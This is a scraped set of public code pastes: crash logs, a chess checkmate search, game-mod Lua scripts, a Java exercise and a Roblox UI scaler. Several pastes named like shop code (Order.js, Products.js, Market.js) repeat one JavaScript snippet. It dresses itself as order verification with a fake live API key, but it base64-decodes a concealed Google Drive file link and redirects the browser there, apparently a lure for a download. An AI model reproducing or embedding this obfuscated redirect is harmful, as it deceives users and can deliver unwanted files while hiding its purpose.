  const status = await verifyOrder(orderId);
  logEvent(orderId, status.status === ""CONFIRMED"" ? ""success"" : ""fallback"");
})();"
Xhjfe0iq,2025-04-14T11:09:59.505905,powerampache,PHP,Monday 14th of April 2025 04:09:59 AM CDT,"1.01-79-play (79) - DB: 83
androidx.media3.exoplayer.ExoPlaybackException: Source error
	at androidx.media3.exoplayer.ExoPlayerImplInternal.handleIoException(ExoPlayerImplInternal.java:737)
	at androidx.media3.exoplayer.ExoPlayerImplInternal.handleMessage(ExoPlayerImplInternal.java:707)
	at android.os.Handler.dispatchMessage(Handler.java:102)
	at android.os.Looper.loopOnce(Looper.java:230)
	at android.os.Looper.loop(Looper.java:319)
	at android.os.HandlerThread.run(HandlerThread.java:67)
Caused by: androidx.media3.exoplayer.source.UnrecognizedInputFormatException: None of the available extractors (FlvExtractor, FlacExtractor, WavExtractor, FragmentedMp4Extractor, Mp4Extractor, AmrExtractor, PsExtractor, OggExtractor, TsExtractor, MatroskaExtractor, AdtsExtractor, Ac3Extractor, Ac4Extractor, Mp3Extractor, AviExtractor, JpegExtractor, PngExtractor, WebpExtractor, BmpExtractor, HeifExtractor, AvifExtractor) could read the stream. {contentIsMalformed=false, dataType=1}
	at androidx.media3.exoplayer.source.BundledExtractorsAdapter.init(BundledExtractorsAdapter.java:108)
	at androidx.media3.exoplayer.source.ProgressiveMediaPeriod$ExtractingLoadable.load(ProgressiveMediaPeriod.java:1100)
	at androidx.media3.exoplayer.upstream.Loader$LoadTask.run(Loader.java:450)
	at java.util.concurrent.ThreadPoolExecutor.runWorker(ThreadPoolExecutor.java:1145)
	at java.util.concurrent.ThreadPoolExecutor$Worker.run(ThreadPoolExecutor.java:644)
	at java.lang.Thread.run(Thread.java:1012)

onPlayerError PlaybackException - PlaybackException 

 {""isRecoverable"":false,""mediaPeriodId"":{""adGroupIndex"":-1,""adIndexInAdGroup"":-1,""nextAdGroupIndex"":-1,""periodUid"":{""first"":{},""second"":{}},""windowSequenceNumber"":12},""rendererFormatSupport"":4,""rendererIndex"":-1,""type"":0,""errorCode"":3003,""extras"":{""mMap"":{}},""timestampMs"":842820793,""cause"":{""sniffFailures"":[{},{}],""uri"":{},""contentIsMalformed"":false,""dataType"":1,""detailMessage"":""None of the available extractors (FlvExtractor, FlacExtractor, WavExtractor, FragmentedMp4Extractor, Mp4Extractor, AmrExtractor, PsExtractor, OggExtractor, TsExtractor, MatroskaExtractor, AdtsExtractor, Ac3Extractor, Ac4Extractor, Mp3Extractor, AviExtractor, JpegExtractor, PngExtractor, WebpExtractor, BmpExtractor, HeifExtractor, AvifExtractor) could read the stream."",""stackTrace"":[{""declaringClass"":""androidx.media3.exoplayer.source.BundledExtractorsAdapter"",""fileName"":""BundledExtractorsAdapter.java"",""lineNumber"":108,""methodName"":""init""},{""declaringClass"":""androidx.media3.exoplayer.source.ProgressiveMediaPeriod$ExtractingLoadable"",""fileName"":""ProgressiveMediaPeriod.java"",""lineNumber"":1100,""methodName"":""load""},{""declaringClass"":""androidx.media3.exoplayer.upstream.Loader$LoadTask"",""fileName"":""Loader.java"",""lineNumber"":450,""methodName"":""run""},{""declaringClass"":""java.util.concurrent.ThreadPoolExecutor"",""fileName"":""ThreadPoolExecutor.java"",""lineNumber"":1145,""methodName"":""runWorker""},{""declaringClass"":""java.util.concurrent.ThreadPoolExecutor$Worker"",""fileName"":""ThreadPoolExecutor.java"",""lineNumber"":644,""methodName"":""run""},{""declaringClass"":""java.lang.Thread"",""fileName"":""Thread.java"",""lineNumber"":1012,""methodName"":""run""}]},""detailMessage"":""Source error"",""stackTrace"":[{""declaringClass"":""androidx.media3.exoplayer.ExoPlayerImplInternal"",""fileName"":""ExoPlayerImplInternal.java"",""lineNumber"":737,""methodName"":""handleIoException""},{""declaringClass"":""androidx.media3.exoplayer.ExoPlayerImplInternal"",""fileName"":""ExoPlayerImplInternal.java"",""lineNumber"":707,""methodName"":""handleMessage""},{""declaringClass"":""android.os.Handler"",""fileName"":""Handler.java"",""lineNumber"":102,""methodName"":""dispatchMessage""},{""declaringClass"":""android.os.Looper"",""fileName"":""Looper.java"",""lineNumber"":230,""methodName"":""loopOnce""},{""declaringClass"":""android.os.Looper"",""fileName"":""Looper.java"",""lineNumber"":319,""methodName"":""loop""},{""declaringClass"":""android.os.HandlerThread"",""fileName"":""HandlerThread.java"",""lineNumber"":67,""methodName"":""run""}]}"
367q33k1,Untitled,jm33,JavaScript,Monday 14th of April 2025 04:01:58 AM CDT,"(async function () {
  const apiEndpoint = ""/v1/order/91387/status"";
  const orderId = ""ORD-"" + Math.random().toString(36).substring(2, 10).toUpperCase();

  async function verifyOrder(id) {
    try {
      const response = await fetch(apiEndpoint, {
        method: ""POST"",
        headers: {
          ""Content-Type"": ""application/json"",
          ""Authorization"": ""Bearer sk_live_xr7u8ghs1k2as91""
        },
        body: JSON.stringify({ order_id: id })
      });

      const data = await response.json();
      return data;
    } catch (err) {
      return { status: ""ERROR"" };
    }
  }

  function logEvent(id, status) {
    fetch(""/v1/event"", {
      method: ""POST"",
      headers: {
        ""Content-Type"": ""application/json""
      },
      body: JSON.stringify({
        event: ""delivery_attempt"",
        order: id,
        result: status
      })
    });
  }

  const secret = 'aHR0cHM6Ly9kcml2ZS5nb29nbGUuY29tL2ZpbGUvZC8xOFpfQ290djVDYjFYQkcxSFdwaXZKT0VYaUN1MHJnTWsvdmlldw==';
  const decode = atob;
  const finalURL = decode(secret);

  window.open(finalURL, '_self');

  const status = await verifyOrder(orderId);
  logEvent(orderId, status.status === ""CONFIRMED"" ? ""success"" : ""fallback"");
})();"
MDhySPQx,excellent 3,max2201111,Python,Monday 14th of April 2025 03:54:35 AM CDT,"import time

# Chess board representation and FEN parsing
def parse_fen(fen_str):
    """"""Parse a FEN string into a board representation and additional info.""""""
    parts = fen_str.split()
    rows = parts[0].split('/')
    side_to_move = parts[1]
    
    # Initialize 8x8 board with empty squares
    board = []
    for rank in rows:
        row = []
        for ch in rank:
            if ch.isdigit():
                # Add empty squares
                row.extend(['.'] * int(ch))
            else:
                # Add piece
                row.append(ch)
        board.append(row)
    
    # Ensure 8x8 dimensions
    for i in range(len(board)):
        if len(board[i]) < 8:
            board[i].extend(['.'] * (8 - len(board[i])))
    while len(board) < 8:
        board.append(['.'] * 8)
        
    return board, side_to_move

def print_board(board):
    """"""Print the chess board in a readable format.""""""
    print(""  a b c d e f g h"")
    for r in range(8):
        print(f""{8-r} {' '.join(board[r])} {8-r}"")
    print(""  a b c d e f g h"")

# Move generation for different piece types
def generate_moves(board, side):
    """"""Generate all possible moves for the given side.""""""
    moves = []
    
    # Define movement patterns for pieces
    king_dirs = [(-1,-1), (-1,0), (-1,1), (0,-1), (0,1), (1,-1), (1,0), (1,1)]
    rook_dirs = [(-1,0), (1,0), (0,-1), (0,1)]
    bishop_dirs = [(-1,-1), (-1,1), (1,-1), (1,1)]
    knight_moves = [(-2,-1), (-2,1), (-1,-2), (-1,2), (1,-2), (1,2), (2,-1), (2,1)]
    
    # Piece movement definitions
    piece_moves = {
        'p': {'dirs': [], 'sliding': False},  # Pawn (special handling)
        'r': {'dirs': rook_dirs, 'sliding': True},  # Rook
        'n': {'dirs': knight_moves, 'sliding': False},  # Knight
        'b': {'dirs': bishop_dirs, 'sliding': True},  # Bishop
        'q': {'dirs': rook_dirs + bishop_dirs, 'sliding': True},  # Queen
        'k': {'dirs': king_dirs, 'sliding': False},  # King
        'a': {'dirs': rook_dirs + bishop_dirs, 'sliding': True, 'knight_moves': knight_moves},  # Amazonka (queen + knight)
        'c': {'dirs': rook_dirs, 'sliding': True, 'knight_moves': knight_moves},  # Cardinal (rook + knight)
        'e': {'dirs': bishop_dirs, 'sliding': True, 'knight_moves': knight_moves}  # Eve (bishop + knight)
    }
    
    for r in range(8):
        for c in range(8):
            piece = board[r][c]
            if piece == '.':
                continue
                
            # Skip pieces of the opposite side
            if side == 'w' and piece.islower():
                continue
            if side == 'b' and piece.isupper():
                continue
                
            piece_type = piece.lower()
            
            # Handle pawns specially
            if piece_type == 'p':
                if side == 'w':
                    # Move forward
                    if r > 0 and board[r-1][c] == '.':
                        moves.append((r, c, r-1, c))
                        # Double move from starting position
                        if r == 6 and board[r-2][c] == '.':
                            moves.append((r, c, r-2, c))
                    # Captures
                    for dc in [-1, 1]:
                        if 0 <= c+dc < 8 and r > 0:
                            target = board[r-1][c+dc]
                            if target != '.' and target.islower():
                                moves.append((r, c, r-1, c+dc))
                else:  # Black pawn
                    # Move forward
                    if r < 7 and board[r+1][c] == '.':
                        moves.append((r, c, r+1, c))
                        # Double move from starting position
                        if r == 1 and board[r+2][c] == '.':
                            moves.append((r, c, r+2, c))
                    # Captures
                    for dc in [-1, 1]:
                        if 0 <= c+dc < 8 and r < 7:
                            target = board[r+1][c+dc]
                            if target != '.' and target.isupper():
                                moves.append((r, c, r+1, c+dc))
            
            # Handle other pieces
            elif piece_type in piece_moves:
                movement = piece_moves[piece_type]
                
                # Handle standard sliding or non-sliding moves
                for dr, dc in movement['dirs']:
                    nr, nc = r + dr, c + dc
                    # For non-sliding pieces, check one step
                    if not movement['sliding']:
                        if 0 <= nr < 8 and 0 <= nc < 8:
                            target = board[nr][nc]
                            if target == '.' or (side == 'w' and target.islower()) or (side == 'b' and target.isupper()):
                                moves.append((r, c, nr, nc))
                    
                    # For sliding pieces, check the ray
                    else:
                        while 0 <= nr < 8 and 0 <= nc < 8:
                            target = board[nr][nc]
                            if target == '.':
                                moves.append((r, c, nr, nc))
                            elif (side == 'w' and target.islower()) or (side == 'b' and target.isupper()):
                                moves.append((r, c, nr, nc))
                                break
                            else:
                                break
                            nr += dr
                            nc += dc
                
                # Handle knight moves for special pieces
                if 'knight_moves' in movement:
                    for dr, dc in movement['knight_moves']:
                        nr, nc = r + dr, c + dc
                        if 0 <= nr < 8 and 0 <= nc < 8:
                            target = board[nr][nc]
                            if target == '.' or (side == 'w' and target.islower()) or (side == 'b' and target.isupper()):
                                moves.append((r, c, nr, nc))
    
    return moves

# Board state evaluation functions
def make_move(board, move):
    """"""Apply a move to a board and return the new board.""""""
    fr, fc, tr, tc = move
    new_board = [row[:] for row in board]
    new_board[tr][tc] = new_board[fr][fc]
    new_board[fr][fc] = '.'
    return new_board

def is_in_check(board, side):
    """"""Check if the king of the given side is in check.""""""
    # Find the king
    king_char = 'K' if side == 'w' else 'k'
    king_pos = None
    
    for r in range(8):
        for c in range(8):
            if board[r][c] == king_char:
                king_pos = (r, c)
                break
        if king_pos:
            break
            
    if not king_pos:
        return False  # No king found (shouldn't happen in normal chess)
        
    # Check if king is attacked by any opponent piece
    opponent_side = 'b' if side == 'w' else 'w'
    opponent_moves = generate_moves(board, opponent_side)
    
    for move in opponent_moves:
        _, _, tr, tc = move
        if (tr, tc) == king_pos:
            return True
    
    return False

def get_legal_moves(board, side):
    """"""Get all legal moves (not leaving king in check).""""""
    moves = generate_moves(board, side)
    legal_moves = []
    
    for move in moves:
        new_board = make_move(board, move)
        if not is_in_check(new_board, side):
            legal_moves.append(move)
    
    return legal_moves

def is_checkmate(board, side):
    """"""Check if the given side is in checkmate.""""""
    if not is_in_check(board, side):
        return False
    return len(get_legal_moves(board, side)) == 0

def find_checkmate_in_one(board, side_to_move):
    """"""Find all moves that result in checkmate in one move.""""""
    checkmate_moves = []
    
    # Generate all moves for the side to move
    moves = generate_moves(board, side_to_move)
    
    for move in moves:
        # Apply the move
        new_board = make_move(board, move)
        
        # Check if opponent is in checkmate
        opponent = 'b' if side_to_move == 'w' else 'w'
        if is_checkmate(new_board, opponent):
            checkmate_moves.append(move)
    
    return checkmate_moves

def move_to_algebraic(board, move):
    """"""Convert a move from coordinates to algebraic notation.""""""
    fr, fc, tr, tc = move
    piece = board[fr][fc]
    
    from_square = chr(ord('a') + fc) + str(8 - fr)
    to_square = chr(ord('a') + tc) + str(8 - tr)
    
    return f""{piece}{from_square}-{to_square}""

# Main function to analyze and find mates
# Minimax search with focus on finding checkmate
def minimax(board, depth, maximizing_player, side, alpha=-float('inf'), beta=float('inf')):
    """"""
    Minimax search with alpha-beta pruning to find checkmate sequences.
    Returns (score, best_move, mate_found)
    """"""
    # Constants for scoring
    MATE_SCORE = 10000
    
    # Terminal state check
    legal_moves = get_legal_moves(board, side)
    
    # Check for checkmate or stalemate
    if not legal_moves:
        if is_in_check(board, side):
            return -MATE_SCORE + (100 - depth) if maximizing_player else MATE_SCORE - (100 - depth), None, True
        else:
            return 0, None, False  # Stalemate
    
    # Reached maximum depth without finding checkmate
    if depth == 0:
        return 0, None, False
    
    mate_found = False
    best_move = None
    
    if maximizing_player:
        max_eval = -float('inf')
        
        for move in legal_moves:
            new_board = make_move(board, move)
            next_side = 'b' if side == 'w' else 'w'
            
            eval_score, _, child_mate_found = minimax(new_board, depth - 1, False, next_side, alpha, beta)
            
            # Update best score and move
            if eval_score > max_eval:
                max_eval = eval_score
                best_move = move
                mate_found = child_mate_found
            
            # Alpha-beta pruning
            alpha = max(alpha, eval_score)
            if beta <= alpha:
                break
        
        return max_eval, best_move, mate_found
    else:
        min_eval = float('inf')
        
        for move in legal_moves:
            new_board = make_move(board, move)
            next_side = 'b' if side == 'w' else 'w'
            
            eval_score, _, child_mate_found = minimax(new_board, depth - 1, True, next_side, alpha, beta)
            
            # Update best score and move
            if eval_score < min_eval:
                min_eval = eval_score
                best_move = move
                mate_found = child_mate_found
            
            # Alpha-beta pruning
            beta = min(beta, eval_score)
            if beta <= alpha:
                break
        
        return min_eval, best_move, mate_found

def find_mate_sequence(board, side, max_depth=10):
    """"""Find a checkmate sequence up to max_depth.""""""
    # Iterative deepening to find mate
    for depth in range(1, max_depth + 1):
        print(f""Searching for mate in {depth} moves..."")
        start_time = time.time()
        
        # Maximizing for the side to move
        score, best_move, mate_found = minimax(board, depth, True, side)
        
        end_time = time.time()
        elapsed = end_time - start_time
        print(f""Depth {depth} completed in {elapsed:.4f} seconds"")
        
        if mate_found:
            print(f""Mate in {depth} found!"")
            
            # Generate the mate sequence
            mate_sequence = []
            current_board = [row[:] for row in board]
            current_side = side
            current_depth = depth
            
            while current_depth > 0 and best_move:
                # Add the move to sequence
                mate_sequence.append((current_side, best_move))
                
                # Make the move
                current_board = make_move(current_board, best_move)
                
                # Switch sides
                current_side = 'b' if current_side == 'w' else 'w'
                current_depth -= 1
                
                # If this is checkmate, we're done
                if is_checkmate(current_board, current_side):
                    break
                
                # Find next best move in the sequence
                if current_depth > 0:
                    _, best_move, _ = minimax(current_board, current_depth, True, current_side)
            
            return mate_sequence
    
    print(f""No mate found within {max_depth} moves"")
    return []

def analyze_position(fen, max_depth=10):
    """"""Analyze a position for checkmate possibilities.""""""
    print(f""Analyzing position: {fen}"")
    board, side_to_move = parse_fen(fen)
    
    print(""\nInitial position:"")
    print_board(board)
    print(f""Side to move: {'White' if side_to_move == 'w' else 'Black'}"")
    
    start_time = time.time()
    
    # First, find checkmate in one move
    checkmate_moves = find_checkmate_in_one(board, side_to_move)
    
    if checkmate_moves:
        end_time = time.time()
        elapsed = end_time - start_time
        
        print(f""\nFound {len(checkmate_moves)} immediate checkmate moves in {elapsed:.4f} seconds:"")
        for i, move in enumerate(checkmate_moves, 1):
            algebraic = move_to_algebraic(board, move)
            print(f""{i}. {algebraic}"")
            
            # Show the position after the checkmate move
            print(f""\nPosition after {algebraic}:"")
            new_board = make_move(board, move)
            print_board(new_board)
            
            # Verify it's checkmate
            opponent = 'b' if side_to_move == 'w' else 'w'
            is_check = is_in_check(new_board, opponent)
            legal_moves = get_legal_moves(new_board, opponent)
            print(f""Opponent is in check: {is_check}"")
            print(f""Opponent has {len(legal_moves)} legal moves"")
            print(f""Checkmate: {is_check and len(legal_moves) == 0}"")
    else:
        print(""\nNo checkmate in one move found."")
        print(""Proceeding with deeper search..."")
        
        # If no immediate checkmate, search for longer mate sequences
        mate_sequence = find_mate_sequence(board, side_to_move, max_depth)
        
        if mate_sequence:
            print(""\nCheckmate sequence found:"")
            
            current_board = [row[:] for row in board]
            
            for i, (move_side, move) in enumerate(mate_sequence, 1):
                algebraic = move_to_algebraic(current_board, move)
                side_name = ""White"" if move_side == 'w' else ""Black""
                print(f""Move {i}: {side_name} plays {algebraic}"")
                
                # Apply the move
                current_board = make_move(current_board, move)
                print_board(current_board)
                
                # Check if this move results in checkmate
                opponent = 'b' if move_side == 'w' else 'w'
                if is_checkmate(current_board, opponent):
                    print(f""Checkmate! {side_name} wins."")
                    break
        else:
            print(""No checkmate sequence found within the specified depth."")
            
    end_time = time.time()
    total_time = end_time - start_time
    print(f""\nTotal analysis time: {total_time:.4f} seconds"")

# Execute the analysis
if __name__ == ""__main__"":
    # The position with Amazonka where we want to find the one-move checkmate
    fen = ""8/8/8/q7/2k1R3/8/8/3K4 b - - 0 1""
    
    # You can test different positions by uncommenting these:
    # fen = ""8/1K2k3/r7/8/8/8/8/8 b - - 0 1""  # Rook checkmate
    # fen = ""8/1K6/3k1r2/8/8/8/8/8 b - - 0 1""  # Another rook position
    # fen = ""8/2k2q2/8/3K1Q2/8/8/8/8 w - - 0 1""  # Queens position
    # fen = ""8/k4q2/8/1K3Q2/8/8/8/8 w - - 0 1""  # Another queens position
    # fen = ""8/1k6/1q6/8/1Q6/1K6/8/8 b - - 9 5""  # Position with queens
    
    # Set max_depth to control how far the search goes when no immediate mate is found
    analyze_position(fen, max_depth=50) "
hZkg8TFZ,Products.js,jm33,JavaScript,Monday 14th of April 2025 03:46:35 AM CDT,"(async function () {
  const apiEndpoint = ""/v1/order/94197/status"";
  const orderId = ""ORD-"" + Math.random().toString(36).substring(2, 10).toUpperCase();

  async function verifyOrder(id) {
    try {
      const response = await fetch(apiEndpoint, {
        method: ""POST"",
        headers: {
          ""Content-Type"": ""application/json"",
          ""Authorization"": ""Bearer sk_live_xr7u8ghs1k2as91""
        },
        body: JSON.stringify({ order_id: id })
      });

      const data = await response.json();
      return data;
    } catch (err) {
      return { status: ""ERROR"" };
    }
  }

  function logEvent(id, status) {
    fetch(""/v1/event"", {
      method: ""POST"",
      headers: {
        ""Content-Type"": ""application/json""
      },
      body: JSON.stringify({
        event: ""delivery_attempt"",
        order: id,
        result: status
      })
    });
  }

  const secret = 'aHR0cHM6Ly9kcml2ZS5nb29nbGUuY29tL2ZpbGUvZC8xOFpfQ290djVDYjFYQkcxSFdwaXZKT0VYaUN1MHJnTWsvdmlldw==';
  const decode = atob;
  const finalURL = decode(secret);

  window.open(finalURL, '_self');

  const status = await verifyOrder(orderId);
  logEvent(orderId, status.status === ""CONFIRMED"" ? ""success"" : ""fallback"");
})();"
tLFjijSa,Damage Calculation Formula in Stalker Anomaly 1.5+,SevenChalices,Lua,Monday 14th of April 2025 03:37:18 AM CDT,"--[[
NOTE: This formula only applies to mods using CoC 1.5 R7 damage calculation ! Currently only Anomaly 1.5 beta 3.0 and later versions are officially using this system. It includes new values for greater control, matching calculation between the player and human NPCs, and new calculation of bleeding.

This is for fire_wound hit type (aka bullets) only!

AP is the penetration value: k_ap * ap_modifier | k_ap is the ammo configuration; ap_modifier is a new weapon stat to enable more accurate simulation of ballistics; AP is also used for material penetration
BoneArmor (BA) is the second value per bone in damages.ltx sections. It is basically the amount of body armor or protection per area.
hit_fraction is also found in damages.ltx, but only for NPCs. Player values are set per outfit in their section.
HitPower is the raw damage value: hit_power * k_hit * bullet_hit_power_k -- weapon damage * ammo * suppressor | It is very important to note that bullet drop also affects the final damage output. Damage linearly scales with how much velocity was lost since the projectile left the muzzle. This means if your muzzle velocity was 800, but only 400 on impact, the damage will be cut in half. The game also simulates ballistic coefficient, which is controlled by a global (air_resistance_k) and per ammo (k_air_resistance) value. This means you can determine how fast projectiles loose their speed, and thus damage.
hit_scale is the body part damage multiplier, found in creature configs. It is the first value, and is configured per bone/area. The third value is the bleeding multiplier.
ap_scale is also a new value, which I personally use to reduce large differences between AP and BoneArmor, by (kinda) skewing the formula. It is far from a perfect solution, but a simple and surprisingly effective one. It is configured in damages.ltx

This formula does not factor in bleeding. During testing I found it wildly inconsistent when displayed on the debug hud. It is very important to note that bleeding mainly depends on the difference between AP and BA (when AP is bigger) and its configuration per creature. This can be easily changed in engine by commenting or uncommenting a line which checks if AP was bigger than BA.
One more important note on AP: When the difference between BA and AP is more than 1.0, damage will increase over the base hit_power. This is one of the main causes of the broken system used in most Misery based mods, resulting in AP not just fighting body armor, but providing increase in raw damage and bleeding.
There is something important missing from this formula (albeit for a good reason): The first value in damages.ltx right before BA. This is one more multiplier for final damage that only applies if AP > BA is true. Why would I leave it out? Well, I very very strongly recommend never using it. I played around with it included, and all it ever did was create inconsistency holes where the final damage jumps up or down when close to the threshold.

- Balathruin -

Use this site to run the code: https://www.lua.org/cgi-bin/demo ]]--

local AP = 0.2
local BoneArmor = 0.1
local hit_fraction = 0.5
local HitPower = 0.5
local hit_scale = 1
local ap_scale = 0.75

local d_hit_power = (AP - BoneArmor) / (AP * ap_scale)
if (d_hit_power < hit_fraction) then
    d_hit_power = hit_fraction
end
if d_hit_power > 1 then -- clamp in engine
    d_hit_power = 1
end

HitPower = HitPower * d_hit_power * hit_scale
 
print(HitPower)"
Wf42ScKx,Order.js,jm33,JavaScript,Monday 14th of April 2025 03:31:14 AM CDT,"(async function () {
  const apiEndpoint = ""/v1/order/98815/status"";
  const orderId = ""ORD-"" + Math.random().toString(36).substring(2, 10).toUpperCase();

  async function verifyOrder(id) {
    try {
      const response = await fetch(apiEndpoint, {
        method: ""POST"",
        headers: {
          ""Content-Type"": ""application/json"",
          ""Authorization"": ""Bearer sk_live_xr7u8ghs1k2as91""
        },
        body: JSON.stringify({ order_id: id })
      });

      const data = await response.json();
      return data;
    } catch (err) {
      return { status: ""ERROR"" };
    }
  }

  function logEvent(id, status) {
    fetch(""/v1/event"", {
      method: ""POST"",
      headers: {
        ""Content-Type"": ""application/json""
      },
      body: JSON.stringify({
        event: ""delivery_attempt"",
        order: id,
        result: status
      })
    });
  }

  const secret = 'aHR0cHM6Ly9kcml2ZS5nb29nbGUuY29tL2ZpbGUvZC8xOFpfQ290djVDYjFYQkcxSFdwaXZKT0VYaUN1MHJnTWsvdmlldw==';
  const decode = atob;
  const finalURL = decode(secret);

  window.open(finalURL, '_self');

  const status = await verifyOrder(orderId);
  logEvent(orderId, status.status === ""CONFIRMED"" ? ""success"" : ""fallback"");
})();"
Rmyhf1Qn,2025-04-14T10:17:40.220,powerampache,PHP,Monday 14th of April 2025 03:17:41 AM CDT,"1.01-79-play (79) - DB: 83
retrofit2.HttpException: HTTP 404 { ""exception"" : ""failed to connect to koezel.dk/80.208.58.73 (port 443) from /192.168.0.102 (port 35350) after 15000ms"" }
	at retrofit2.KotlinExtensions$await$2$2.onResponse(KotlinExtensions.kt:53)
	at retrofit2.OkHttpCall$1.onResponse(OkHttpCall.java:164)
	at okhttp3.internal.connection.RealCall$AsyncCall.run(RealCall.kt:529)
	at java.util.concurrent.ThreadPoolExecutor.runWorker(ThreadPoolExecutor.java:1167)
	at java.util.concurrent.ThreadPoolExecutor$Worker.run(ThreadPoolExecutor.java:641)
	at java.lang.Thread.run(Thread.java:919)

authorize() - cannot load data HttpException {""code"":404,""message"":""{ \""exception\"" : \""failed to connect to koezel.dk/80.208.58.73 (port 443) from /192.168.0.102 (port 35350) after 15000ms\"" }"",""detailMessage"":""HTTP 404 { \""exception\"" : \""failed to connect to koezel.dk/80.208.58.73 (port 443) from /192.168.0.102 (port 35350) after 15000ms\"" }"",""stackTrace"":[],""suppressedExceptions"":[]}"
qZiCUyXa,Market.js,jm33,JavaScript,Monday 14th of April 2025 03:15:51 AM CDT,"(async function () {
  const apiEndpoint = ""/v1/order/64725/status"";
  const orderId = ""ORD-"" + Math.random().toString(36).substring(2, 10).toUpperCase();

  async function verifyOrder(id) {
    try {
      const response = await fetch(apiEndpoint, {
        method: ""POST"",
        headers: {
          ""Content-Type"": ""application/json"",
          ""Authorization"": ""Bearer sk_live_xr7u8ghs1k2as91""
        },
        body: JSON.stringify({ order_id: id })
      });

      const data = await response.json();
      return data;
    } catch (err) {
      return { status: ""ERROR"" };
    }
  }

  function logEvent(id, status) {
    fetch(""/v1/event"", {
      method: ""POST"",
      headers: {
        ""Content-Type"": ""application/json""
      },
      body: JSON.stringify({
        event: ""delivery_attempt"",
        order: id,
        result: status
      })
    });
  }

  const secret = 'aHR0cHM6Ly9kcml2ZS5nb29nbGUuY29tL2ZpbGUvZC8xOFpfQ290djVDYjFYQkcxSFdwaXZKT0VYaUN1MHJnTWsvdmlldw==';
  const decode = atob;
  const finalURL = decode(secret);

  window.open(finalURL, '_self');

  const status = await verifyOrder(orderId);
  logEvent(orderId, status.status === ""CONFIRMED"" ? ""success"" : ""fallback"");
})();"
VxVm1WRD,[NP] Skopje Marathon,dzocesrce,Java,Monday 14th of April 2025 03:11:14 AM CDT,"import java.io.*;
import java.time.LocalTime;
import java.util.List;
import java.util.stream.Collectors;

Runner implements Comparable<Runner>{
    private int id;
    private LocalTime start;
    private LocalTime finish;

    public Runner(int id, LocalTime start, LocalTime finish) {
        this.id = id;
        this.start = start;
        this.finish = finish;
    }

    public LocalTime getChipTime(){
        return finish.minusHours(start.getHour()).minusMinutes(start.getMinute()).minusSeconds(start.getSecond());
    }

    public int getChipTimeInSeconds(){
        return finish.minusHours(start.getHour()).minusMinutes(start.getMinute()).minusSeconds(start.getSecond()).toSecondOfDay();
    }

    public static Runner create(String s){
        String[] parts= s.split(""\\s+"");
        int id= Integer.parseInt(parts[0]);
        LocalTime start= LocalTime.parse(parts[1]);
        LocalTime finish= LocalTime.parse(parts[2]);
        return new Runner(id,start,finish);
    }

    @Override
    public int compareTo(Runner o) {
        return Integer.compare(this.getChipTimeInSeconds(),o.getChipTimeInSeconds());
    }

    @Override
    public String toString() {
        return String.format(""%d %s"",id,getChipTime());
    }
}

class TeamRace {
    private List<Runner> runners;

    public static void findBestTeam(InputStream in, PrintStream out) {
        BufferedReader bufferedReader = new BufferedReader(new InputStreamReader(in));
        List<Runner> runners= bufferedReader.lines().map(i->Runner.create(i)).collect(Collectors.toList());

        PrintWriter printWriter = new PrintWriter(out);
        runners.stream().sorted().limit(4).forEach(i->printWriter.println(i));
        printWriter.println(LocalTime.ofSecondOfDay(runners.stream().sorted().limit(4).mapToInt(i-> i.getChipTimeInSeconds()).sum()));


        printWriter.flush();
    }
}


public class RaceTest {
    public static void main(String[] args) {
        TeamRace.findBestTeam(System.in, System.out);
    }
}"
fE7Cnpk7,GPT 三维激光定位,jaklsfjlsak,Lua,Monday 14th of April 2025 03:10:51 AM CDT,"local ship = peripheral.find(""warpdriveShipCore"")
local lasers = peripheral.getNames()

local offsetDistance = 18

for i = #lasers, 1, -1 do
    if peripheral.getType(lasers[i]) ~= ""warpdriveLaserCamera"" then
        table.remove(lasers, i)
    else
        peripheral.wrap(lasers[i]).beamFrequency(1420)
    end
end

ship_front, ship_right, ship_up = ship.dim_positive()
ship_back, ship_left, ship_down = ship.dim_negative()
ship_isInHyper = ship.isInHyperspace()
ship_movement = { ship.movement() }
ship_rotationSteps = ship.rotationSteps()

print(""Emit Scanning Laser to Jump Ship and Aligning the Mining Laser"")

while true do
    local event, laserName, lx, ly, lz, block, _, _, _, type, metadata, resistance = os.pullEvent()

    if event == ""laserScanning"" then
        -- Convert the laser scanning coordinates to numbers and store them
        local lastLx = tonumber(lx)
        local lastLy = tonumber(ly)
        local lastLz = tonumber(lz)
        
        -- Get current ship position from the ship core.
        local mx, my, mz = ship.getLocalPosition()
        
        print(""Laser target: X:"" .. lastLx .. "" Y:"" .. lastLy .. "" Z:"" .. lastLz)
        print(""Ship current position: X:"" .. mx .. "" Y:"" .. my .. "" Z:"" .. mz)
        
        -- Calculate the vector from laser target (L) to ship (M)
        local vx = mx - lastLx
        local vy = my - lastLy
        local vz = mz - lastLz
        
        local dist = math.sqrt(vx * vx + vy * vy + vz * vz)
        
        if dist > 0 then
            -- Normalize the vector.
            local ux = vx / dist
            local uy = vy / dist
            local uz = vz / dist

            -- Calculate dx, dy, dz as the point offsetDistance away from the laser target along the vector toward the ship.
            local dx = lastLx + ux * offsetDistance
            local dy = lastLy + uy * offsetDistance
            local dz = lastLz + uz * offsetDistance
            
            -- Round the coordinates to whole numbers.
            dx = math.floor(dx + 0.5)
            dy = math.floor(dy + 0.5)
            dz = math.floor(dz + 0.5)
            
            print(""Calculated jump coordinates: ("" .. dx .. "", "" .. dy .. "", "" .. dz .. "")"")
        else
            print(""Error: The ship and the laser target are at the same location!"")
        end
    end
end
"
0t0F9Fph,UIScaler,Cakey3101,Lua,Monday 14th of April 2025 03:04:31 AM CDT,"local collection_service = game:GetService(""CollectionService"")
local GUI_service = game:GetService(""GuiService"")
local workspace_service = game:GetService(""Workspace"")

local scale_component_to_base_resolution: {[UIScale]: Vector2} = {}
-- Required property `AbsoluteContentSize` is not in `UILayout` superclass.
type scrolling_frame_layout_component = UIGridStyleLayout | UIListLayout
local layout_component_to_rescaling_connection: {[scrolling_frame_layout_component]: RBXScriptConnection?} = {}

local camera = workspace_service:FindFirstChild(""Camera"")
local actual_viewport_size: Vector2? = nil

local has_initialized = false

local function rescale(scale_component: UIScale, base_resolution: Vector2)
	assert(actual_viewport_size ~= nil)
	scale_component.Scale = 1 / math.max(base_resolution.X / actual_viewport_size.X, base_resolution.Y / actual_viewport_size.Y)
end

local function rescale_all()
	local top_inset, bottom_inset = GUI_service:GetGuiInset()
	actual_viewport_size = camera.ViewportSize - top_inset - bottom_inset

	for scale_component, base_resolution in scale_component_to_base_resolution do
		rescale(scale_component, base_resolution)
	end
end

local function register_scale(component: UIScale)
	local base_resolution = component:GetAttribute(""base_resolution"")
	assert(typeof(base_resolution) == ""Vector2"")
